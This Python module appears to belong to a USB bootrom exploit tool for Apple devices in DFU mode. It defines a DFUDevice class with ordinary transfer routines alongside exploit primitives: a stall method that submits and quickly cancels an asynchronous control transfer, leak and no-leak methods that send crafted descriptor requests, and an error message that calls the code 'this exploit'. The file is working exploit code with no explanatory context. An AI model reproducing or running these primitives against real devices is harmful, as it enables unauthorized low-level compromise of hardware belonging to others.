import sys
import time

from usb.backend import libusb1
from usb import core, util
import usb

import array
import ctypes
import struct
import sys
import time

import libusbfinder

# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None


class Device:
    def __init__(self, device):
        self.device = device


class DFUDevice:
    MAX_PACKET_SIZE = 0x800

    def __init__(self):
        self.device = DFUDevice.acquire_device()

    def reacquire(self):
        self.device = DFUDevice.acquire_device()

    def release(self):
        util.dispose_resources(self.device)

    def reset_counters(self):
        # print 'Resetting USB counters.'
        assert self.device.ctrl_transfer(0x21, 4, 0, 0, 0, 1000) == 0

    def usb_reset(self):
        print('Performing USB port reset.')
        try:
            self.device.reset()
        except Exception as ex:
            # OK: doesn't happen on Yosemite but happens on El Capitan and Sierra
            # print('Caught exception during port reset; should still work.')
            pass

    def send_data(self, data):
        # print 'Sending 0x%x of data to device.' % len(data)
        index = 0
        while index < len(data):
            amount = min(len(data) - index, DFUDevice.MAX_PACKET_SIZE)
            assert self.device.ctrl_transfer(0x21, 1, 0, 0, data[index:index + amount], 5000) == amount
            index += amount

    def get_data(self, amount):
        # print 'Getting 0x%x of data from device.' % amount
        data = str()
        while amount > 0:
            part = min(amount, DFUDevice.MAX_PACKET_SIZE)
            ret = self.device.ctrl_transfer(0xA1, 2, 0, 0, part, 5000)
            assert len(ret) == part
            data += ret.tostring()
            amount -= part
        return data

    def request_image_validation(self):
        # print 'Requesting image validation.'
        assert self.device.ctrl_transfer(0x21, 1, 0, 0, '', 1000) == 0
        self.device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)
        self.device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)
        self.device.ctrl_transfer(0xA1, 3, 0, 0, 6, 1000)
        self.usb_reset()

    def stall(self):
        self.libusb1_async_ctrl_transfer(0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)

    def leak(self):
        self.libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, 0xC0, 1)

    def no_leak(self):
        self.libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, 0xC1, 1)

    def usb_req_stall(self):
        self.libusb1_no_error_ctrl_transfer(0x2, 3, 0x0, 0x80, 0x0, 10)

    def usb_req_leak(self):
        self.libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, 0x40, 1)

    def usb_req_no_leak(self):
        self.libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, 0x41, 1)

    @staticmethod
    def acquire_device(timeout=5.0, match=None, fatal=True):
        backend = libusb1.get_backend(find_library=lambda x: libusbfinder.libusb1_path())
        # print 'Acquiring device handle.'
        # Keep retrying for up to timeout seconds if device is not found.
        start = time.time()
        once = False
        while not once or time.time() - start < timeout:
            once = True
            for device in core.find(find_all=True, idVendor=0x5AC, idProduct=0x1227, backend=backend):
                if match is not None and match not in device.serial_number:
                    continue
                util.claim_interface(device, 0)
                return device
            time.sleep(0.001)
        if fatal:
            raise AssertionError('ERROR: No Apple device in DFU Mode 0x1227 detected after %0.2f second timeout. '
                                 'Exiting.' % timeout)

        return None

    def libusb1_create_ctrl_transfer(self, request, timeout):
        ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
        assert ptr is not None

        transfer = ptr.contents
        transfer.dev_handle = self.device._ctx.handle.handle
        transfer.endpoint = 0  # EP0
        transfer.type = 0  # LIBUSB_TRANSFER_TYPE_CONTROL
        transfer.timeout = timeout
        transfer.buffer = request.buffer_info()[0]  # C-pointer to request buffer
        transfer.length = len(request)
        transfer.user_data = None
        transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0)  # NULL
        transfer.flags = 1 << 1  # LIBUSB_TRANSFER_FREE_BUFFER

        return ptr

    def libusb1_async_ctrl_transfer(self, bmRequestType, bRequest, wValue, wIndex, data, timeout):
        if usb.backend.libusb1._lib is not self.device._ctx.backend.lib:
            raise AssertionError('ERROR: This exploit requires libusb1 backend, but another backend is being used. '
                                 'Exiting.')

        global request, transfer_ptr, never_free_device
        request_timeout = int(timeout) if timeout >= 1 else 0
        start = time.time()
        never_free_device = self.device
        request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
        transfer_ptr = self.libusb1_create_ctrl_transfer(request, request_timeout)
        assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

        while time.time() - start < timeout / 1000.0:
            pass

        # Prototype of libusb_cancel_transfer is missing from pyusb
        usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
            ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
        assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0

    def libusb1_no_error_ctrl_transfer(self, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):
        try:
            ret = self.device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
            print("ctrl transfer good: %d %d" % (bmRequestType, bRequest))
            # print("ctrl transfer", ret)
        except Exception as e:
            # traceback.print_exc()
            print("ctrl transfer ERROR: %d %d %r" % (bmRequestType, bRequest, e))
            pass